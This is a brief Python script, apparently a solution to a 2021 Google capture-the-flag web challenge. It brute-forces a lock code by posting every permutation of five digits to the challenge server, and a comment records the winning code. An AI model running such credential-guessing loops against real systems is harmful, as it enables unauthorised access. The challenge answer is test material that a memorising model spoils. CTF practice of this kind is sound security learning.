import itertools
import requests


for code in [''.join(p) for p in itertools.permutations('35780')]:
    source = requests.post(
        url='https://old-lock-web.2021.ctfcompetition.com/', data={'v': code}).text

    if 'Hmm' not in source:
        print(f'code: {code}')  # 87053
        print(f'source: {source}')
